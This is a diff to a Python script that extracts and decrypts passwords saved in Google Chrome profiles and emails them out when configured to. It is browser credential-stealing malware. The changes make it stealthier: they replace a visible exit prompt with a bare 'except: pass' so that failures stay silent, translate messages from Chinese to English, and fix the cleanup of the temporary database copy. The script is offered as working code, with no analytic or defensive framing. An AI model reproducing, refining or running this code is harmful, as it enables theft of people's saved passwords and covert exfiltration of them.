@@ -32,7 +32,6 @@ def read_yaml(yaml_path: Union[str, Path]) -> Dict:
             data.update(read_yaml(Path(config_path).parent / i))
     return data
 
-# 获取打包后可执行文件所在的目录
 
 config = read_yaml('config.yaml')
 
@@ -65,8 +64,8 @@ def get_fencrypted_key():
         os.remove(temp_path)
         return secret_key
     except Exception as e:
-        if os.path.exists("temp"):
-            os.remove("temp")
+        if os.path.exists(temp_path):
+            os.remove(temp_path)
         return None
     
 
@@ -88,7 +87,7 @@ def decrypt_password(ciphertext, secret_key):
         return ""
 
 if __name__ == '__main__':
-    # try:
+    try:
         fencrypted_key = get_fencrypted_key()
         db_path = os.path.normpath(google_info_path_1 + google_info_path_2)
         folders = [element for element in os.listdir(db_path) if re.search("^Profile*|^Default$",element)!=None]
@@ -100,7 +99,7 @@ if __name__ == '__main__':
                 shutil.copy2(db_path_folder, temp_db_path) 
                 conn = sqlite3.connect(temp_db_path)
             except Exception as e:
-                print("数据库打开失败:".format(e))
+                print("db open fail:".format(e))
                 exit(0)
             if(fencrypted_key and conn):
                 cursor = conn.cursor()
@@ -124,6 +123,6 @@ if __name__ == '__main__':
         if(config["output"]["email"] == "ON"):
            email_send('chrome',str(ret_list))
         
-    # except:
-    #     input("按任意键退出")
+    except:
+        pass
     
